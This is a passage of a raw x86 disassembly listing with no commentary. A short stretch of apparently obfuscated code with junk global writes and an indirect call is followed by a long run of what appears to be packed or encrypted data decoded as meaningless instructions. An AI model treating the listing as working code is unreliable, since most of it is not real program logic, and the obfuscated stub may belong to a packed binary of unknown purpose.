  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   eax,DWORD PTR [eax+eax*4+0x7a7addf8],0x5f0a7a7a
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x34652f1b
  4028f0:	imul   esp,DWORD PTR [esi+0x55],0x6d6a6a61
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1d42f8bf
  40298a:	sub    edx,ebp
  40298c:	aas    
  40298d:	push   eax
  40298e:	inc    esi
  40298f:	popf   
  402990:	sub    esi,DWORD PTR [edi]
  402992:	frstor [edx+esi*1+0x15]
  402996:	push   eax
  402997:	retf   0x373
  40299a:	jmp    0x4029c9
  40299c:	jl     0x402983
  40299e:	pop    ebx
  40299f:	and    edi,DWORD PTR [bx+di+0x820]
  4029a4:	div    DWORD PTR [esi]
  4029a6:	in     al,dx
  4029a7:	push   ebx
  4029a8:	imul   edi,DWORD PTR [edx-0x2b9e58aa],0x6b91ead
  4029b2:	mov    esi,0xa062b4f9
  4029b7:	cdq    
  4029b8:	push   ds
  4029b9:	xchg   DWORD PTR [edi-0x53],ecx
  4029bc:	(bad)  
  4029bd:	test   BYTE PTR [edx-0x305a2c4a],0x56
  4029c4:	fild   WORD PTR [ebp-0x2d04dc8a]
  4029ca:	mov    al,ds:0x3bf4a8f3
  4029cf:	xor    al,0xda
  4029d1:	pop    ds
  4029d2:	mov    esp,0xe8f8dc49
  4029d7:	jmp    0x402975
  4029d9:	stos   BYTE PTR es:[edi],al
  4029da:	dec    DWORD PTR [esi+0x4d3070bf]
  4029e0:	jnp    0x40297a
  4029e2:	aam    0xfb
  4029e4:	push   ecx
  4029e5:	lahf   
  4029e6:	call   0xe240:0x8acd732a
  4029ed:	or     bl,BYTE PTR [ebp+0x22]
  4029f0:	test   al,0x10
  4029f2:	adc    DWORD PTR [esi+0x1cdd2b2f],ebx
  4029f8:	push   0x70246011
  4029fd:	das    
  4029fe:	sub    dl,BYTE PTR [edi+0x3b]
  402a01:	adc    eax,ebx
  402a03:	xlat   BYTE PTR ds:[ebx]
  402a04:	test   eax,0x32822790
  402a09:	out    dx,eax
  402a0a:	xchg   ebp,eax
  402a0b:	and    DWORD PTR [edx],eax
  402a0d:	lahf   
  402a0e:	inc    eax
  402a0f:	xchg   edi,eax
  402a10:	jns    0x402a71
  402a12:	jae    0x402a15
  402a14:	sub    ebx,DWORD PTR [ecx]
  402a16:	add    ebp,DWORD PTR [ecx-0x15952ee]
  402a1c:	js     0x402a99
  402a1e:	or     ecx,esp
  402a20:	test   DWORD PTR [edx-0x75],edx
  402a23:	(bad)  
  402a24:	push   edx
  402a25:	shl    DWORD PTR [ebx+ebx*4+0x3e],0x72
  402a2a:	inc    esi
  402a2b:	xor    DWORD PTR [esi+ecx*1-0x714cf875],edx
  402a32:	dec    ebp
  402a33:	xchg   esi,eax
  402a34:	scas   al,BYTE PTR es:[edi]
  402a35:	mov    al,0x57
  402a37:	xchg   edx,eax
  402a38:	fadd   QWORD PTR [esi]
  402a3a:	lods   al,BYTE PTR ds:[esi]
  402a3b:	mov    esp,DWORD PTR [eax+0x55]
  402a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a3f:	inc    esp
  402a40:	mov    ds:0x12e60bad,eax
  402a45:	add    dh,BYTE PTR [edi]
  402a47:	or     eax,0x6f452471
  402a4c:	add    eax,0x21098f90
  402a51:	aas    
  402a52:	pop    ebp
  402a53:	push   0xffffff88
  402a55:	fiadd  WORD PTR ds:0x62e0a129
  402a5b:	mov    cl,bl
  402a5d:	jb     0x402a1e
  402a5f:	dec    ebp
  402a60:	xchg   esp,eax
  402a61:	dec    ebx
  402a62:	int3   
  402a63:	cdq    
  402a64:	xor    ebx,DWORD PTR [eax+0x53cad6d9]
  402a6a:	jae    0x402a69
  402a6c:	adc    BYTE PTR [ebx+esi*1],dh
  402a6f:	or     bl,bl
  402a71:	imul   eax,ecx,0x7a
  402a74:	out    0xda,al
  402a76:	add    BYTE PTR [edi+0x48b0b6c4],dl
  402a7c:	mov    eax,0xb874ae0
  402a81:	repz mov WORD PTR [ecx-0x59a2b09b],es
  402a88:	pop    esp
  402a89:	rcr    dh,1
  402a8b:	fcmovbe st,st(7)
  402a8d:	xchg   ecx,eax
  402a8e:	cdq    
  402a8f:	iret   
  402a90:	sub    al,0x78
  402a92:	or     al,0x27
  402a94:	xchg   esp,eax
  402a95:	push   0xe1ebf150
  402a9a:	test   eax,0xf91f199
  402a9f:	xchg   DWORD PTR [ecx+eax*1],ebx
  402aa2:	iret   
  402aa3:	xor    ebx,esp
  402aa5:	std    
  402aa6:	ins    DWORD PTR es:[edi],dx
  402aa7:	sub    al,BYTE PTR [edx+0x53]
  402aaa:	repz lahf 
  402aac:	daa    
  402aad:	pop    esi
  402aae:	test   BYTE PTR [edx],dl
  402ab0:	xor    DWORD PTR [ebx],esi
  402ab2:	push   edx
  402ab3:	aaa    
  402ab4:	std    
  402ab5:	dec    eax
  402ab6:	cwde   
  402ab7:	lods   al,BYTE PTR ds:[esi]
  402ab8:	push   edi
  402ab9:	and    DWORD PTR [edi],edi
  402abb:	jnp    0x402a81
  402abd:	into   
  402abe:	ret    0x97fd
  402ac1:	aas    
  402ac2:	cwde   
  402ac3:	pop    ecx
  402ac4:	cdq    
  402ac5:	xchg   edi,eax
  402ac6:	test   eax,0xaeb79e6f
  402acb:	xlat   BYTE PTR ds:[ebx]
  402acc:	push   edi
  402acd:	pop    ebx
  402ace:	or     eax,0x79f245f
  402ad3:	adc    eax,0xa42e4da0
  402ad8:	out    dx,al
  402ad9:	dec    ecx
  402ada:	out    dx,eax
  402adb:	outs   dx,BYTE PTR ds:[esi]
  402adc:	push   cs
  402add:	cmp    BYTE PTR [ebp+0x71a2bd4b],bh
  402ae3:	adc    esp,ecx
  402ae5:	addr16 je 0x402b10
  402ae8:	cmc    
  402ae9:	(bad)  
  402aea:	mov    esp,0x46c99a97
  402aef:	pop    ss
  402af0:	into   
  402af1:	ins    DWORD PTR es:[edi],dx
  402af2:	scas   al,BYTE PTR es:[edi]
  402af3:	cli    
  402af4:	adc    eax,0xe2a8206e
  402af9:	jecxz  0x402b7a
  402afb:	out    0xe3,al
  402afd:	sbb    dh,BYTE PTR [esi-0x7e]
  402b00:	and    al,0x8a
  402b02:	inc    eax
  402b03:	setb   BYTE PTR [ebp-0x1e653b25]
  402b0a:	popa   
  402b0b:	mov    edx,0x41ab15ce
  402b10:	push   ebx
  402b11:	ins    BYTE PTR es:[edi],dx
  402b12:	sub    DWORD PTR [edi],ecx
  402b14:	or     BYTE PTR [edx],0x9f
  402b17:	pop    ss
  402b18:	test   eax,0x1a13251b
  402b1d:	bswap  esp
  402b1f:	sbb    ecx,DWORD PTR [edx+0x3f]
  402b22:	push   ecx
  402b23:	xchg   ebp,eax
  402b24:	out    dx,eax
  402b25:	ret    0x74a3
  402b28:	jno    0x402b4f
  402b2a:	jbe    0x402b24
  402b2c:	lods   eax,DWORD PTR ds:[esi]
  402b2d:	ss dec esi
  402b2f:	push   esp
  402b30:	shl    DWORD PTR [ebx],0xdd
  402b33:	(bad)  
  402b34:	int    0x4a
  402b36:	sbb    eax,0xfad839d5
  402b3b:	leave  
  402b3c:	test   DWORD PTR [edx-0x2d],ebx
  402b3f:	pusha  
  402b40:	dec    edi
  402b41:	sub    cl,BYTE PTR [ebx+0x3cd4a590]
  402b47:	xor    al,BYTE PTR [esp+eax*8-0x38]
  402b4b:	retf   0xa052
  402b4e:	inc    edx
  402b4f:	sub    edi,DWORD PTR [ecx-0x4b]
  402b52:	mov    ss,WORD PTR [ebx]
  402b54:	and    DWORD PTR [edx-0x774df5e2],ecx
  402b5a:	jb     0x402aeb
  402b5c:	sahf   
  402b5d:	xchg   edi,eax
  402b5e:	lahf   
  402b5f:	cmp    al,0x13
  402b61:	xor    esi,DWORD PTR [esp+ebp*2]
  402b64:	iret   
  402b65:	add    ah,BYTE PTR ds:0x2c9b2076
  402b6b:	push   es
  402b6c:	and    al,0xab
  402b6e:	mov    eax,ds:0x7164bf1e
  402b73:	add    al,0x51
  402b75:	adc    al,0x27
  402b77:	pop    ebx
  402b78:	(bad)  
  402b79:	mov    eax,ds:0xb83dfd8e
  402b7e:	mov    ebx,0x987acaf2
  402b83:	mov    ds:0xd975b5f2,eax
  402b88:	or     eax,0x10ac43da
  402b8d:	cwde   
  402b8e:	mov    esi,0xb31f6e0c
  402b93:	jb     0x402be0
  402b95:	lds    esp,FWORD PTR [esp+edi*4]
  402b98:	xor    BYTE PTR [eax+0x411b23c1],ch
  402b9e:	xchg   ebx,eax
  402b9f:	jae    0x402b6d
  402ba1:	cmc    
  402ba2:	shl    BYTE PTR [edi+0x5c0dec73],1
  402ba8:	ret    0x4201
  402bab:	rcr    dl,1
  402bad:	mov    ah,0x3
  402baf:	lahf   
  402bb0:	or     edi,ebx
  402bb2:	aad    0x91
  402bb4:	pop    eax
  402bb5:	popa   
  402bb6:	mov    ebp,0xaabbefd1
  402bbb:	aas    
  402bbc:	(bad)
  402bbf:	xor    ch,dh
  402bc1:	(bad)  
  402bc3:	xor    eax,0xbb0b1095
  402bc8:	and    DWORD PTR [edx+0x11],0x709981a4
  402bcf:	push   0x69305e7d
  402bd4:	into   
  402bd5:	(bad)  
  402bd7:	pop    ds
  402bd8:	push   ss
  402bd9:	add    BYTE PTR [edx-0x108036dd],dl
  402bdf:	pushf  
  402be0:	mov    eax,DWORD PTR [eax+0x54]
  402be3:	xor    BYTE PTR [edi-0x7375df69],cl
  402be9:	xor    DWORD PTR [eax-0x7d],0xc6c262d1
  402bf0:	adc    al,0x36
  402bf2:	pop    edx
  402bf3:	(bad)  
  402bf4:	loopne 0x402b92
  402bf6:	xor    BYTE PTR [edi+0x5438b751],al
  402bfc:	imul   eax,DWORD PTR [edx-0x3b],0xffffffb2
  402c00:	(bad)  [edi+0x1235e91]
  402c06:	stos   DWORD PTR es:[edi],eax
  402c07:	push   ecx
  402c08:	fwait
  402c09:	gs pushf 
  402c0b:	shr    DWORD PTR [ecx-0x443acb55],1
  402c11:	mov    edx,0xcd009efc
  402c16:	retf   0x70a1
  402c19:	fsubr  st,st(4)
  402c1b:	sub    DWORD PTR [edx-0x17c82d55],ebp
  402c21:	adc    eax,0x61ccf619
  402c26:	fst    st(6)
  402c28:	jb     0x402bf0
  402c2a:	pop    ss
  402c2b:	push   eax
  402c2c:	stos   DWORD PTR es:[edi],eax
  402c2d:	jb     0x402bf8
  402c2f:	push   esi
  402c30:	pushf  
  402c31:	cmp    ebp,DWORD PTR [eax+0x41]
  402c34:	into   
  402c35:	in     al,dx
  402c36:	add    bl,0xff
  402c39:	shr    DWORD PTR [esi+0x5136642f],1
  402c3f:	pop    ecx
  402c40:	call   0x7001310f
  402c45:	push   edi
  402c46:	pop    eax
  402c47:	push   0x34
  402c49:	jge    0x402bd2
  402c4b:	cli    
  402c4c:	push   ebp
  402c4d:	inc    edi
  402c4e:	retf   0xb5f9
  402c51:	add    ecx,0xe
  402c54:	add    bl,BYTE PTR [ebx+0x4b2a35d4]
  402c5a:	inc    edx
  402c5b:	stos   DWORD PTR es:[edi],eax
  402c5c:	sbb    BYTE PTR [edx+0x1ab07e04],al
  402c62:	push   ecx
  402c63:	aaa    
  402c64:	xchg   ecx,eax
  402c65:	jmp    0x402c7b
  402c67:	add    al,0x14
  402c69:	clc    
  402c6a:	fcmovnbe st,st(4)
  402c6c:	xor    cl,bh
  402c6e:	jne    0x402cb2
  402c70:	arpl   bp,di
  402c72:	icebp  
  402c73:	fisub  WORD PTR [ecx+0x5ce02f47]
  402c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c7a:	dec    esi
  402c7b:	shl    esp,0x73
  402c7e:	pop    esi
  402c7f:	add    cl,bl
  402c81:	add    dl,dh
  402c83:	jge    0x402ce7
  402c85:	aad    0xae
  402c87:	test   BYTE PTR [edx+esi*1+0x219840dc],0x53
  402c8f:	mov    al,0xa0
  402c91:	gs into 
  402c93:	in     al,dx
  402c94:	in     al,0x69
  402c96:	aad    0x5b
  402c98:	pushf  
  402c99:	test   eax,0xf2fee5ba
  402c9e:	push   esi
  402c9f:	mov    dh,0x5f
  402ca1:	or     BYTE PTR [ebx-0x53],al
  402ca4:	mov    ebx,0x1382001d
  402ca9:	adc    bh,BYTE PTR [edi]
  402cab:	scas   eax,DWORD PTR es:[edi]
  402cac:	fcmovnbe st,st(0)
  402cae:	cwde   
  402caf:	into   
  402cb0:	(bad)  
  402cb1:	(bad)  
  402cb2:	ja     0x402c66
  402cb4:	jno    0x402c6a
  402cb6:	add    eax,DWORD PTR [esi+0x1e]
  402cb9:	and    BYTE PTR [eax+0x6d],al
  402cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402cbd:	imul   ecx,edi,0x66
  402cc0:	pop    eax
  402cc1:	test   eax,0xfd500386
  402cc6:	ret    
  402cc7:	mov    ecx,0x5835f71d
  402ccc:	dec    ebp
  402ccd:	xor    al,0xc6
  402ccf:	mov    bl,0x80
  402cd1:	out    dx,eax
  402cd2:	lahf   
  402cd3:	mov    esi,0xa8720a06
  402cd8:	xor    eax,0xb80021bc
  402cdd:	mov    ds:0xfa0dc8ee,eax
  402ce2:	jge    0x402d13
  402ce4:	jns    0x402d3e
  402ce6:	mov    eax,esp
  402ce8:	or     esp,esp
  402cea:	sbb    al,0x6f
  402cec:	test   eax,0xc77ee8b1
  402cf1:	(bad)  
  402cf2:	in     al,0x67
  402cf4:	sbb    al,0xd3
  402cf6:	loopne 0x402c96
  402cf8:	push   ds
  402cf9:	xor    al,0x52
  402cfb:	dec    esi
  402cfc:	dec    edi
  402cfd:	pop    ebp
  402cfe:	cwde   
  402cff:	push   ecx
  402d00:	mov    bl,0x20
  402d02:	mov    ebp,0x93a9d372
  402d07:	lahf   
  402d08:	ins    DWORD PTR es:[edi],dx
  402d09:	ret    
  402d0a:	retf   0x261a
  402d0d:	ret    
  402d0e:	fwait
  402d0f:	aam    0x63
  402d11:	jno    0x402d1a
  402d13:	or     esp,0x46
  402d16:	sbb    bl,dh
  402d18:	xchg   DWORD PTR [eax+0x2ea1902c],edi
  402d1e:	jb     0x402ce8
  402d20:	dec    ebp
  402d21:	sub    BYTE PTR [eax],dh
  402d23:	xchg   edx,ebx
  402d25:	pop    ecx
  402d26:	sbb    eax,0xfd3a9976
  402d2b:	mov    ah,0xfd
  402d2d:	sub    esi,DWORD PTR [ebp+0x2f1f5646]
  402d33:	cmp    ch,bl
  402d35:	or     BYTE PTR [eax+esi*4-0x30],bl
  402d39:	xchg   cl,bh
  402d3b:	es je  0x402cdf
  402d3e:	pop    ebp
  402d3f:	or     BYTE PTR [ecx+0x42d9c66f],0x53
  402d46:	sbb    al,0x3d
  402d48:	mov    ds:0xb75af6e1,eax
  402d4d:	or     al,0xb
  402d4f:	or     BYTE PTR [ebp+edx*4+0x7e4499a2],0x16
  402d57:	sbb    BYTE PTR [ebp+0x35ae4b20],0x13
  402d5e:	clc    
  402d5f:	scas   al,BYTE PTR es:[edi]
  402d60:	iret   
  402d61:	nop
  402d62:	int3   
  402d63:	xchg   ecx,eax
  402d64:	mov    ds:0xc5f9f163,al
  402d69:	xlat   BYTE PTR ds:[ebx]
  402d6a:	adc    eax,0xc265ab7
  402d6f:	sbb    al,0x13
  402d71:	adc    eax,DWORD PTR [edx+0x2c]
  402d74:	iret   
  402d75:	dec    esp
  402d76:	adc    edx,0x5ae8eaed
  402d7c:	or     cl,BYTE PTR [ebx]
  402d7e:	or     eax,0xbb88b09b
  402d83:	lods   al,BYTE PTR ds:[esi]
  402d84:	outs   dx,DWORD PTR ds:[esi]
  402d85:	adc    eax,0xcb9824ec
  402d8a:	stos   BYTE PTR es:[edi],al
  402d8b:	mov    BYTE PTR [eax],ch
  402d8d:	call   0xc0dd:0xbc4820c2
  402d94:	xchg   ebp,eax
  402d95:	pop    ebp
  402d96:	pop    ebp
  402d97:	cs (bad) 
  402d99:	dec    DWORD PTR [ebp+0x0]
  402d9c:	or     DWORD PTR [edi],edi
  402d9e:	out    0x90,eax
  402da0:	xlat   BYTE PTR ds:[ebx]
  402da1:	adc    esp,DWORD PTR [ecx-0x49c575b7]
  402da7:	retf   
  402da8:	mov    dl,0xab
  402daa:	pop    eax
  402dab:	pop    edi
  402dac:	popf   
  402dad:	mov    edx,0xb681a992
  402db2:	or     dl,ch
  402db4:	xchg   esp,eax
  402db5:	popa   
  402db6:	icebp  
  402db7:	iret   
  402db8:	int    0x86
  402dba:	sub    BYTE PTR [edi-0xae41df6],bl
  402dc0:	or     ah,BYTE PTR [edx+0x1f]
  402dc3:	or     ecx,esp
  402dc5:	pop    ds
  402dc6:	mov    DWORD PTR [ebx],esi
  402dc8:	xor    esi,DWORD PTR [ebx-0x692d1986]
  402dce:	jmp    0x402e47
  402dd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dd1:	lea    edi,[ebx+0x2cc7b8c5]
  402dd7:	fstp   TBYTE PTR [eax-0x35b90efe]
  402ddd:	cli    
  402dde:	shl    BYTE PTR [ebp+0x59],cl
  402de1:	adc    DWORD PTR [edi-0x7b],0x74e515a8
  402de8:	jns    0x402dbd
  402dea:	sbb    eax,0x261f7755
  402def:	pop    esi
  402df0:	pop    es
  402df1:	pop    edx
  402df2:	inc    edx
  402df3:	fisubr DWORD PTR ds:[edx+0x7]
  402df7:	mov    al,ds:0xd323fb5c
  402dfc:	js     0x402de4
  402dfe:	ror    BYTE PTR [ebx-0x6f],cl
  402e01:	lods   eax,DWORD PTR ds:[esi]
  402e02:	or     edi,eax
  402e04:	pushf  
  402e05:	lods   eax,DWORD PTR ds:[esi]
  402e06:	or     BYTE PTR [ebp+0x46c1a3e1],al
  402e0c:	sbb    eax,0x6b502ee8
  402e11:	push   eax
  402e12:	loop   0x402e75
  402e14:	or     bl,BYTE PTR [edi-0xd]
  402e17:	ds fneni(8087 only) 
  402e1a:	mov    DWORD PTR [esi+esi*2-0x3cd87506],0xb6ae9685
  402e25:	lods   al,BYTE PTR ds:[esi]
  402e26:	push   esi
  402e27:	ins    BYTE PTR es:[edi],dx
  402e28:	xor    BYTE PTR [ebx],dl
  402e2a:	enter  0x469e,0x52
  402e2e:	rcr    DWORD PTR [bp-0x59d2],1
  402e33:	push   eax
  402e34:	outs   dx,BYTE PTR ds:[esi]
  402e35:	lahf   
  402e36:	mov    al,0x59
  402e38:	aas    
  402e39:	or     edi,ecx
  402e3b:	es repnz loopne 0x402e18
  402e3f:	fimul  WORD PTR [ebx]
  402e41:	mov    ss:0x25307ddd,al
  402e47:	mov    ch,0x3
  402e49:	aam    0x9d
  402e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e4c:	push   esp
  402e4d:	retf   0x6213
  402e50:	pop    ebp
  402e51:	pop    edi
  402e52:	pop    eax
  402e53:	stc    
  402e54:	sub    DWORD PTR [ebx+0x22247ba4],ebx
  402e5a:	int3   
  402e5b:	or     ah,bl
  402e5d:	shl    DWORD PTR [ebp+0x29],0xb6
  402e61:	jmp    0xb2c8:0xecc06455
  402e68:	rcl    bh,cl
  402e6a:	rep stos BYTE PTR es:[edi],al
  402e6c:	sar    DWORD PTR [esi],1
  402e6e:	outs   dx,DWORD PTR ds:[esi]
  402e6f:	(bad)  
  402e70:	scas   eax,DWORD PTR es:[edi]
  402e71:	test   BYTE PTR [esi-0x33],dl
  402e74:	or     bh,BYTE PTR [edi-0x29]
  402e77:	fld    QWORD PTR [edi-0x7dd3557c]
  402e7d:	mov    bl,0x1b
  402e7f:	leave  
  402e80:	xchg   edx,eax
  402e81:	jge    0x402eda
  402e83:	imul   esi,DWORD PTR [esi],0x86f6f137
  402e89:	add    eax,0xc586357c
  402e8e:	aad    0xef
  402e90:	(bad)  
  402e91:	pop    eax
  402e92:	int    0x8
  402e94:	rol    BYTE PTR [esi+0x6ec3250d],1
  402e9a:	inc    esp
  402e9b:	addr16 add eax,0xdb13a4fd
  402ea1:	cmp    eax,0xc69d1336
  402ea6:	mov    bl,0xbe
  402ea8:	mov    cl,0x37
  402eaa:	xor    ecx,DWORD PTR [ebx-0x42]
  402ead:	push   ebp
  402eae:	adc    eax,DWORD PTR [ecx]
  402eb0:	inc    ecx
  402eb1:	or     al,0xc3
  402eb3:	dec    edi
  402eb4:	aaa    
  402eb5:	jo     0x402ed6
  402eb7:	push   eax
  402eb8:	in     eax,dx
  402eb9:	jb     0x402f35
  402ebb:	dec    edi
  402ebc:	or     BYTE PTR [esi+0x1f],bh
  402ebf:	sub    al,0xb
  402ec1:	iret   
  402ec2:	sbb    eax,0x8622b1e7
  402ec7:	or     cl,BYTE PTR [ecx]
  402ec9:	aam    0x84
  402ecb:	call   0x294b1d04
  402ed0:	aas    
  402ed1:	inc    edi
  402ed2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ed3:	outs   dx,BYTE PTR ds:[esi]
  402ed4:	pop    edx
  402ed5:	mov    ebx,0xf87d7683
  402eda:	pop    ebx
  402edb:	cli    
  402edc:	mov    ebp,0xe32ff8a
  402ee1:	repnz rcl DWORD PTR ss:[ebp-0x7],0xb7
  402ee7:	in     eax,0xf4
  402ee9:	fst    QWORD PTR [ebx-0x80a716d]
  402eef:	push   ebx
  402ef0:	xchg   ebx,eax
  402ef1:	imul   ebx,DWORD PTR [edi+0x4],0xe69bb18c
  402ef8:	xor    DWORD PTR [edi-0x2cfcd42],ecx
  402efe:	je     0x402e95
  402f00:	out    dx,eax
  402f01:	mov    edi,0xc2a95f1e
  402f06:	dec    ebp
  402f07:	call   0x4dab:0xe4dab282
  402f0e:	ss test eax,0x12a9e936
  402f14:	push   ecx
  402f15:	daa    
  402f16:	xchg   BYTE PTR [eax+esi*2],bl
  402f19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f1a:	xor    bh,BYTE PTR ds:0x2a7a9782
  402f20:	mov    ebp,0xdfdc6615
  402f25:	je     0x402f30
  402f27:	mov    cl,BYTE PTR [edx]
  402f29:	icebp  
  402f2a:	dec    ebx
  402f2b:	dec    ebp
  402f2c:	mov    bh,0xec
  402f2e:	aad    0x46
  402f30:	push   ecx
  402f31:	cmp    dh,0x57
  402f34:	sub    dl,BYTE PTR [esi+0x77]
  402f37:	imul   ebx,DWORD PTR [eax-0x5a],0x65
  402f3b:	xchg   esi,eax
  402f3c:	das    
  402f3d:	sbb    dh,dl
  402f3f:	sti    
  402f40:	scas   eax,DWORD PTR es:[edi]
  402f41:	jecxz  0x402f68
  402f43:	ret    0x8030
  402f46:	lods   al,BYTE PTR ds:[esi]
  402f47:	mov    DWORD PTR [edi],0x800a62f5
  402f4d:	mov    bh,0xe
  402f4f:	adc    eax,0x401ec9ca
  402f54:	mov    esp,0x23a5ff8e
  402f59:	in     eax,dx
  402f5a:	in     al,0xa2
  402f5c:	(bad)  
  402f5d:	xchg   edx,eax
  402f5e:	xchg   esi,eax
  402f5f:	(bad)  
  402f60:	and    DWORD PTR [esi-0x52],esp
  402f63:	std    
  402f64:	(bad)  [edi]
  402f66:	push   eax
  402f67:	and    DWORD PTR ds:0xe886442,ebx
  402f6d:	loopne 0x402faa
  402f6f:	cli    
  402f70:	dec    ecx
  402f71:	or     al,0xd1
  402f73:	and    DWORD PTR [ecx-0x68],0x5ca5ad3a
  402f7a:	cld    
  402f7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f7c:	push   ss
  402f7d:	mov    ah,0xd5
  402f7f:	shl    BYTE PTR [eax+0x13af62e6],1
  402f85:	dec    esi
  402f86:	push   eax
  402f87:	icebp  
  402f88:	fwait
  402f89:	and    BYTE PTR [ecx+eiz*2],dl
  402f8c:	or     BYTE PTR [edi],0xa9
  402f8f:	inc    esi
  402f90:	loopne 0x402f4b
  402f92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f93:	dec    ecx
  402f94:	xchg   esp,eax
  402f95:	push   edx
  402f96:	pop    esp
  402f97:	mov    esi,0xbbcc3045
  402f9c:	sbb    al,ch
  402f9e:	test   eax,0x3a155c1c
  402fa3:	adc    BYTE PTR [edx-0x19],dh
  402fa6:	pop    esp
  402fa7:	ret    0x6584
  402faa:	retf   
  402fab:	data16 cld 
  402fad:	ret    0xc256
  402fb0:	add    BYTE PTR [edi+edi*1+0xe],al
  402fb4:	add    ah,dh
  402fb6:	push   cs
  402fb7:	fbstp  TBYTE PTR [eax+0x48]
  402fba:	adc    cl,dl
  402fbc:	inc    ebx
  402fbd:	cmp    cl,BYTE PTR [ebp+0x78fc6d4e]
  402fc3:	pushf  
  402fc4:	ret    0x73eb
  402fc7:	mov    cl,0xbf
  402fc9:	xor    eax,0x2f6fe428
  402fce:	jmp    0xc3b8:0x8410b95f
  402fd5:	mov    bl,0x69
  402fd7:	retf   0xe17c
  402fda:	and    eax,0xdb7c8c1f
  402fdf:	nop
  402fe0:	rcr    DWORD PTR ds:0x60472040,0x32
  402fe7:	arpl   sp,ax
  402fe9:	imul   ebp,DWORD PTR [edx],0x2d
  402fec:	(bad)  
  402fed:	int    0x5d
  402fef:	fadd   QWORD PTR [edi]
  402ff1:	xor    al,0x8f
